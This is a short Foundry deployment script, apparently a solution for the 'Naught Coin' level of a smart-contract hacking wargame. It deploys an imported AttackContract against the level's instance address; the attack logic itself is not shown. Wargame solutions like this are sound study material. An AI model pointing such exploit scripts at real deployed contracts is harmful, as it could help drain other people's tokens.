// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {HelperFunctions} from "script/HelperFunctions.s.sol";

import {AttackContract} from "../src/Level15.sol";

// ================================================================
// │                     LEVEL 15 - NAUGHT COIN                   │
// ================================================================
contract Exploit is Script, HelperFunctions {
    function run() public {
        address targetContractAddress = getInstanceAddress();

        vm.startBroadcast();
        new AttackContract(targetContractAddress);
        vm.stopBroadcast();
    }
}
